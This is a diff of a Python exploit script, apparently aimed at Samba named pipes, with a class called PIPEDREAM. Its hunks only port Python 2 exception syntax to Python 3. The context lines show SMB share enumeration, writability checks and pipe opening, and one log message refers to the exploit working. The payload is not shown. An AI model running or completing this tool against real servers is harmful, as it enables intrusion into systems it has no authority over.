@@ -54,14 +54,14 @@ class PIPEDREAM:
         try:
             logging.debug('Connecting to share %s' % shareName)
             tid = self.__smbClient.connectTree(shareName)
-        except Exception, e:
+        except Exception as e:
             logging.debug(str(e))
             return False
 
         try:
             self.__smbClient.openFile(tid, '\\', FILE_WRITE_DATA, creationOption=FILE_DIRECTORY_FILE)
             writable = True
-        except Exception, e:
+        except Exception as e:
             writable = False
             pass
 
@@ -185,7 +185,7 @@ class PIPEDREAM:
         logging.info('Share path is %s' % sharePath)
         try:
             self.openPipe(sharePath, fileName)
-        except Exception, e:
+        except Exception as e:
             if str(e).find('STATUS_OBJECT_NAME_NOT_FOUND') >= 0:
                 logging.info('Expected STATUS_OBJECT_NAME_NOT_FOUND received, doesn\'t mean the exploit worked tho')
             else:
@@ -283,7 +283,7 @@ if __name__ == '__main__':
             smbClient._SMBConnection._Session['SessionFlags'] &=  ~SMB2_SESSION_FLAG_ENCRYPT_DATA
         pipeDream = PIPEDREAM(smbClient, options)
         pipeDream.run()
-    except Exception, e:
+    except Exception as e:
         if logging.getLogger().level == logging.DEBUG:
             import traceback
             traceback.print_exc()
